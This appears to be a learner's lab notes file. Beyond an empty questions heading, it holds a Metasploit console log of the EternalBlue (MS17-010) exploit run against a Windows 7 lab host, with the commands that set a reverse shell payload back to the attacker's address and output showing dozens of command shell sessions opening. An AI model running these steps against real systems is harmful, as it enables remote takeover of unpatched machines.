@@ -1,0 +1,360 @@
+===============================================================================================================================
+                                                    GAIN ACCESS
+===============================================================================================================================
+
+-----------------
+    QUESTIONS
+-----------------
+
+
+
+
+
+===============================================================================================================================
+
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) > options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Window
+                                             s Embedded Standard 7 target machines.
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Em
+                                             bedded Standard 7 target machines.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Sta
+                                             ndard 7 target machines.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.0.104    yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.220.63
+RHOSTS => 10.10.220.63
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
+payload => windows/x64/shell/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.4.27.78
+LHOST => 10.4.27.78
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+
+[*] Started reverse TCP handler on 10.4.27.78:4444 
+[*] 10.10.167.164:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 10.10.167.164:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 10.10.167.164:445     - Scanned 1 of 1 hosts (100% complete)
+[+] 10.10.167.164:445 - The target is vulnerable.
+[*] 10.10.167.164:445 - Connecting to target for exploitation.
+[+] 10.10.167.164:445 - Connection established for exploitation.
+[+] 10.10.167.164:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 10.10.167.164:445 - CORE raw buffer dump (42 bytes)
+[*] 10.10.167.164:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+[*] 10.10.167.164:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+[*] 10.10.167.164:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
+[+] 10.10.167.164:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 10.10.167.164:445 - Trying exploit with 12 Groom Allocations.
+[*] 10.10.167.164:445 - Sending all but last fragment of exploit packet
+[*] 10.10.167.164:445 - Starting non-paged pool grooming
+[+] 10.10.167.164:445 - Sending SMBv2 buffers
+[+] 10.10.167.164:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 10.10.167.164:445 - Sending final SMBv2 buffers.
+[*] 10.10.167.164:445 - Sending last fragment of exploit packet!
+[*] 10.10.167.164:445 - Receiving response from exploit packet
+[+] 10.10.167.164:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 10.10.167.164:445 - Sending egg to corrupted connection.
+[*] 10.10.167.164:445 - Triggering free of corrupted buffer.
+[-] 10.10.167.164:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[-] 10.10.167.164:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[-] 10.10.167.164:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[*] 10.10.167.164:445 - Connecting to target for exploitation.
+[+] 10.10.167.164:445 - Connection established for exploitation.
+[+] 10.10.167.164:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 10.10.167.164:445 - CORE raw buffer dump (42 bytes)
+[*] 10.10.167.164:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+[*] 10.10.167.164:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+[*] 10.10.167.164:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
+[+] 10.10.167.164:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 10.10.167.164:445 - Trying exploit with 17 Groom Allocations.
+[*] 10.10.167.164:445 - Sending all but last fragment of exploit packet
+[*] 10.10.167.164:445 - Starting non-paged pool grooming
+[+] 10.10.167.164:445 - Sending SMBv2 buffers
+[+] 10.10.167.164:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 10.10.167.164:445 - Sending final SMBv2 buffers.
+[*] 10.10.167.164:445 - Sending last fragment of exploit packet!
+[*] 10.10.167.164:445 - Receiving response from exploit packet
+[+] 10.10.167.164:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 10.10.167.164:445 - Sending egg to corrupted connection.
+[*] 10.10.167.164:445 - Triggering free of corrupted buffer.
+[-] 10.10.167.164:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[-] 10.10.167.164:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[-] 10.10.167.164:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[*] 10.10.167.164:445 - Connecting to target for exploitation.
+[+] 10.10.167.164:445 - Connection established for exploitation.
+[+] 10.10.167.164:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 10.10.167.164:445 - CORE raw buffer dump (42 bytes)
+[*] 10.10.167.164:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+[*] 10.10.167.164:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+[*] 10.10.167.164:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
+[+] 10.10.167.164:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 10.10.167.164:445 - Trying exploit with 22 Groom Allocations.
+[*] 10.10.167.164:445 - Sending all but last fragment of exploit packet
+[*] 10.10.167.164:445 - Starting non-paged pool grooming
+[+] 10.10.167.164:445 - Sending SMBv2 buffers
+[+] 10.10.167.164:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 10.10.167.164:445 - Sending final SMBv2 buffers.
+[*] 10.10.167.164:445 - Sending last fragment of exploit packet!
+[*] 10.10.167.164:445 - Receiving response from exploit packet
+[+] 10.10.167.164:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 10.10.167.164:445 - Sending egg to corrupted connection.
+[*] 10.10.167.164:445 - Triggering free of corrupted buffer.
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Command shell session 1 opened (10.4.27.78:4444 -> 10.10.167.164:49208) at 2021-09-13 00:55:55 +0500
+[*] Command shell session 2 opened (10.4.27.78:4444 -> 10.10.167.164:49206) at 2021-09-13 00:55:55 +0500
+[*] Command shell session 3 opened (10.4.27.78:4444 -> 10.10.167.164:49207) at 2021-09-13 00:55:55 +0500
+[*] Command shell session 4 opened (10.4.27.78:4444 -> 10.10.167.164:49205) at 2021-09-13 00:55:55 +0500
+[*] Command shell session 5 opened (10.4.27.78:4444 -> 10.10.167.164:49209) at 2021-09-13 00:55:55 +0500
+[*] Sending stage (336 bytes) to 10.10.167.164
+[*] Sending stage (336 bytes) to 10.10.167.164
+[+] 10.10.167.164:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.167.164:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.167.164:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+[*] Command shell session 6 opened (10.4.27.78:4444 -> 10.10.167.164:49210) at 2021-09-13 00:55:58 +0500
+[*] Command shell session 7 opened (10.4.27.78:4444 -> 10.10.167.164:49211) at 2021-09-13 00:55:58 +0500
+[*] Command shell session 8 opened (10.4.27.78:4444 -> 10.10.167.164:49212) at 2021-09-13 00:55:58 +0500
+[*] Command shell session 9 opened (10.4.27.78:4444 -> 10.10.167.164:49213) at 2021-09-13 00:55:58 +0500
+[*] Command shell session 10 opened (10.4.27.78:4444 -> 10.10.167.164:49215) at 2021-09-13 00:55:58 +0500
+[*] Command shell session 11 opened (10.4.27.78:4444 -> 10.10.167.164:49214) at 2021-09-13 00:56:01 +0500
+[*] Command shell session 12 opened (10.4.27.78:4444 -> 10.10.167.164:49216) at 2021-09-13 00:56:01 +0500
+[*] Command shell session 13 opened (10.4.27.78:4444 -> 10.10.167.164:49217) at 2021-09-13 00:56:01 +0500
+[*] Command shell session 14 opened (10.4.27.78:4444 -> 10.10.167.164:49218) at 2021-09-13 00:56:01 +0500
+[*] Command shell session 15 opened (10.4.27.78:4444 -> 10.10.167.164:49219) at 2021-09-13 00:56:01 +0500
+[*] Command shell session 16 opened (10.4.27.78:4444 -> 10.10.167.164:49221) at 2021-09-13 00:56:04 +0500
+[*] Command shell session 17 opened (10.4.27.78:4444 -> 10.10.167.164:49220) at 2021-09-13 00:56:04 +0500
+[*] Command shell session 19 opened (10.4.27.78:4444 -> 10.10.167.164:49223) at 2021-09-13 00:56:04 +0500
+[*] Command shell session 18 opened (10.4.27.78:4444 -> 10.10.167.164:49222) at 2021-09-13 00:56:04 +0500
+[*] Command shell session 20 opened (10.4.27.78:4444 -> 10.10.167.164:49224) at 2021-09-13 00:56:04 +0500
+[*] Command shell session 21 opened (10.4.27.78:4444 -> 10.10.167.164:49226) at 2021-09-13 00:56:08 +0500
+[*] Command shell session 22 opened (10.4.27.78:4444 -> 10.10.167.164:49225) at 2021-09-13 00:56:08 +0500
+[*] Command shell session 24 opened (10.4.27.78:4444 -> 10.10.167.164:49228) at 2021-09-13 00:56:08 +0500
+[*] Command shell session 23 opened (10.4.27.78:4444 -> 10.10.167.164:49227) at 2021-09-13 00:56:08 +0500
+[*] Command shell session 25 opened (10.4.27.78:4444 -> 10.10.167.164:49230) at 2021-09-13 00:56:08 +0500
+[*] Command shell session 26 opened (10.4.27.78:4444 -> 10.10.167.164:49229) at 2021-09-13 00:56:11 +0500
+[*] Command shell session 28 opened (10.4.27.78:4444 -> 10.10.167.164:49232) at 2021-09-13 00:56:11 +0500
+[*] Command shell session 27 opened (10.4.27.78:4444 -> 10.10.167.164:49231) at 2021-09-13 00:56:11 +0500
+[*] Command shell session 29 opened (10.4.27.78:4444 -> 10.10.167.164:49234) at 2021-09-13 00:56:11 +0500
+[*] Command shell session 30 opened (10.4.27.78:4444 -> 10.10.167.164:49233) at 2021-09-13 00:56:11 +0500
+[*] Command shell session 31 opened (10.4.27.78:4444 -> 10.10.167.164:49235) at 2021-09-13 00:56:14 +0500
+[*] Command shell session 32 opened (10.4.27.78:4444 -> 10.10.167.164:49236) at 2021-09-13 00:56:14 +0500
+[*] Command shell session 33 opened (10.4.27.78:4444 -> 10.10.167.164:49237) at 2021-09-13 00:56:14 +0500
+[*] Command shell session 34 opened (10.4.27.78:4444 -> 10.10.167.164:49238) at 2021-09-13 00:56:14 +0500
+[*] Command shell session 35 opened (10.4.27.78:4444 -> 10.10.167.164:49239) at 2021-09-13 00:56:14 +0500
+[*] Command shell session 36 opened (10.4.27.78:4444 -> 10.10.167.164:49240) at 2021-09-13 00:56:17 +0500
+[*] Command shell session 37 opened (10.4.27.78:4444 -> 10.10.167.164:49241) at 2021-09-13 00:56:17 +0500
+[*] Command shell session 38 opened (10.4.27.78:4444 -> 10.10.167.164:49242) at 2021-09-13 00:56:17 +0500
+[*] Command shell session 39 opened (10.4.27.78:4444 -> 10.10.167.164:49243) at 2021-09-13 00:56:17 +0500
+[*] Command shell session 40 opened (10.4.27.78:4444 -> 10.10.167.164:49244) at 2021-09-13 00:56:17 +0500
+[*] Command shell session 41 opened (10.4.27.78:4444 -> 10.10.167.164:49245) at 2021-09-13 00:56:20 +0500
+[*] Command shell session 42 opened (10.4.27.78:4444 -> 10.10.167.164:49246) at 2021-09-13 00:56:20 +0500
+[*] Command shell session 43 opened (10.4.27.78:4444 -> 10.10.167.164:49247) at 2021-09-13 00:56:20 +0500
+[*] Command shell session 44 opened (10.4.27.78:4444 -> 10.10.167.164:49248) at 2021-09-13 00:56:20 +0500
+[*] Command shell session 45 opened (10.4.27.78:4444 -> 10.10.167.164:49249) at 2021-09-13 00:56:20 +0500
+[*] Command shell session 46 opened (10.4.27.78:4444 -> 10.10.167.164:49250) at 2021-09-13 00:56:24 +0500
+[*] Command shell session 47 opened (10.4.27.78:4444 -> 10.10.167.164:49251) at 2021-09-13 00:56:24 +0500
+[*] Command shell session 48 opened (10.4.27.78:4444 -> 10.10.167.164:49252) at 2021-09-13 00:56:24 +0500
+[*] Command shell session 49 opened (10.4.27.78:4444 -> 10.10.167.164:49253) at 2021-09-13 00:56:24 +0500
+[*] Command shell session 50 opened (10.4.27.78:4444 -> 10.10.167.164:49254) at 2021-09-13 00:56:24 +0500
+[*] Command shell session 51 opened (10.4.27.78:4444 -> 10.10.167.164:49255) at 2021-09-13 00:56:27 +0500
+[*] Command shell session 52 opened (10.4.27.78:4444 -> 10.10.167.164:49256) at 2021-09-13 00:56:27 +0500
+[*] Command shell session 53 opened (10.4.27.78:4444 -> 10.10.167.164:49257) at 2021-09-13 00:56:27 +0500
+[*] Command shell session 54 opened (10.4.27.78:4444 -> 10.10.167.164:49258) at 2021-09-13 00:56:27 +0500
+[*] Command shell session 55 opened (10.4.27.78:4444 -> 10.10.167.164:49259) at 2021-09-13 00:56:27 +0500
+[*] Command shell session 57 opened (10.4.27.78:4444 -> 10.10.167.164:49261) at 2021-09-13 00:56:30 +0500
+[*] Command shell session 56 opened (10.4.27.78:4444 -> 10.10.167.164:49260) at 2021-09-13 00:56:30 +0500
+[*] Command shell session 58 opened (10.4.27.78:4444 -> 10.10.167.164:49262) at 2021-09-13 00:56:30 +0500
+[*] Command shell session 59 opened (10.4.27.78:4444 -> 10.10.167.164:49263) at 2021-09-13 00:56:30 +0500
+[*] Command shell session 60 opened (10.4.27.78:4444 -> 10.10.167.164:49264) at 2021-09-13 00:56:30 +0500
+[*] Command shell session 61 opened (10.4.27.78:4444 -> 10.10.167.164:49265) at 2021-09-13 00:56:33 +0500
+[*] Command shell session 62 opened (10.4.27.78:4444 -> 10.10.167.164:49266) at 2021-09-13 00:56:33 +0500
+[*] Command shell session 63 opened (10.4.27.78:4444 -> 10.10.167.164:49267) at 2021-09-13 00:56:33 +0500
+[*] Command shell session 64 opened (10.4.27.78:4444 -> 10.10.167.164:49268) at 2021-09-13 00:56:33 +0500
+[*] Command shell session 65 opened (10.4.27.78:4444 -> 10.10.167.164:49269) at 2021-09-13 00:56:33 +0500
+[*] Command shell session 66 opened (10.4.27.78:4444 -> 10.10.167.164:49270) at 2021-09-13 00:56:36 +0500
+[*] Command shell session 67 opened (10.4.27.78:4444 -> 10.10.167.164:49271) at 2021-09-13 00:56:36 +0500
+[*] Command shell session 68 opened (10.4.27.78:4444 -> 10.10.167.164:49272) at 2021-09-13 00:56:36 +0500
+[*] Command shell session 69 opened (10.4.27.78:4444 -> 10.10.167.164:49273) at 2021-09-13 00:56:36 +0500
+[*] Command shell session 70 opened (10.4.27.78:4444 -> 10.10.167.164:49274) at 2021-09-13 00:56:37 +0500
+[*] Command shell session 71 opened (10.4.27.78:4444 -> 10.10.167.164:49275) at 2021-09-13 00:56:40 +0500
+[*] Command shell session 72 opened (10.4.27.78:4444 -> 10.10.167.164:49276) at 2021-09-13 00:56:40 +0500
+[*] Command shell session 73 opened (10.4.27.78:4444 -> 10.10.167.164:49277) at 2021-09-13 00:56:40 +0500
+[*] Command shell session 74 opened (10.4.27.78:4444 -> 10.10.167.164:49278) at 2021-09-13 00:56:40 +0500
+[*] Command shell session 75 opened (10.4.27.78:4444 -> 10.10.167.164:49279) at 2021-09-13 00:56:40 +0500
+[*] Command shell session 76 opened (10.4.27.78:4444 -> 10.10.167.164:49280) at 2021-09-13 00:56:43 +0500
+[*] Command shell session 77 opened (10.4.27.78:4444 -> 10.10.167.164:49281) at 2021-09-13 00:56:43 +0500
+[*] Command shell session 78 opened (10.4.27.78:4444 -> 10.10.167.164:49282) at 2021-09-13 00:56:43 +0500
+[*] Command shell session 79 opened (10.4.27.78:4444 -> 10.10.167.164:49283) at 2021-09-13 00:56:43 +0500
+[*] Command shell session 80 opened (10.4.27.78:4444 -> 10.10.167.164:49284) at 2021-09-13 00:56:43 +0500
+[*] Command shell session 81 opened (10.4.27.78:4444 -> 10.10.167.164:49285) at 2021-09-13 00:56:46 +0500
+[*] Command shell session 82 opened (10.4.27.78:4444 -> 10.10.167.164:49286) at 2021-09-13 00:56:46 +0500
+[*] Command shell session 83 opened (10.4.27.78:4444 -> 10.10.167.164:49287) at 2021-09-13 00:56:46 +0500
+[*] Command shell session 84 opened (10.4.27.78:4444 -> 10.10.167.164:49288) at 2021-09-13 00:56:46 +0500
+[*] Command shell session 85 opened (10.4.27.78:4444 -> 10.10.167.164:49289) at 2021-09-13 00:56:46 +0500
+[*] Command shell session 86 opened (10.4.27.78:4444 -> 10.10.167.164:49290) at 2021-09-13 00:56:49 +0500
+[*] Command shell session 87 opened (10.4.27.78:4444 -> 10.10.167.164:49291) at 2021-09-13 00:56:49 +0500
+[*] Command shell session 88 opened (10.4.27.78:4444 -> 10.10.167.164:49292) at 2021-09-13 00:56:49 +0500
+[*] Command shell session 89 opened (10.4.27.78:4444 -> 10.10.167.164:49293) at 2021-09-13 00:56:49 +0500
+[*] Command shell session 90 opened (10.4.27.78:4444 -> 10.10.167.164:49294) at 2021-09-13 00:56:49 +0500
+[*] Command shell session 91 opened (10.4.27.78:4444 -> 10.10.167.164:49295) at 2021-09-13 00:56:53 +0500
+[*] Command shell session 92 opened (10.4.27.78:4444 -> 10.10.167.164:49296) at 2021-09-13 00:56:53 +0500
+[*] Command shell session 93 opened (10.4.27.78:4444 -> 10.10.167.164:49297) at 2021-09-13 00:56:53 +0500
+[*] Command shell session 94 opened (10.4.27.78:4444 -> 10.10.167.164:49298) at 2021-09-13 00:56:53 +0500
+[*] Command shell session 95 opened (10.4.27.78:4444 -> 10.10.167.164:49299) at 2021-09-13 00:56:53 +0500
+[*] Command shell session 96 opened (10.4.27.78:4444 -> 10.10.167.164:49300) at 2021-09-13 00:56:56 +0500
+[*] Command shell session 97 opened (10.4.27.78:4444 -> 10.10.167.164:49301) at 2021-09-13 00:56:56 +0500
+[*] Command shell session 98 opened (10.4.27.78:4444 -> 10.10.167.164:49302) at 2021-09-13 00:56:56 +0500
+[*] Command shell session 99 opened (10.4.27.78:4444 -> 10.10.167.164:49303) at 2021-09-13 00:56:56 +0500
+[*] Command shell session 100 opened (10.4.27.78:4444 -> 10.10.167.164:49304) at 2021-09-13 00:56:56 +0500
+[*] Command shell session 102 opened (10.4.27.78:4444 -> 10.10.167.164:49306) at 2021-09-13 00:56:59 +0500
+[*] Command shell session 101 opened (10.4.27.78:4444 -> 10.10.167.164:49305) at 2021-09-13 00:56:59 +0500
+[*] Command shell session 103 opened (10.4.27.78:4444 -> 10.10.167.164:49307) at 2021-09-13 00:56:59 +0500
+[*] Command shell session 104 opened (10.4.27.78:4444 -> 10.10.167.164:49308) at 2021-09-13 00:56:59 +0500
+[*] Command shell session 105 opened (10.4.27.78:4444 -> 10.10.167.164:49309) at 2021-09-13 00:56:59 +0500
+[*] Command shell session 107 opened (10.4.27.78:4444 -> 10.10.167.164:49311) at 2021-09-13 00:57:02 +0500
+[*] Command shell session 106 opened (10.4.27.78:4444 -> 10.10.167.164:49310) at 2021-09-13 00:57:02 +0500
+[*] Command shell session 108 opened (10.4.27.78:4444 -> 10.10.167.164:49312) at 2021-09-13 00:57:02 +0500
+[*] Command shell session 109 opened (10.4.27.78:4444 -> 10.10.167.164:49313) at 2021-09-13 00:57:02 +0500
+
+
+C:\Windows\system32>^Z
+Background session 5? [y/N]  y
+msf6 exploit(windows/smb/ms17_010_eternalblue) > 
+
+
+
+
+
+
+
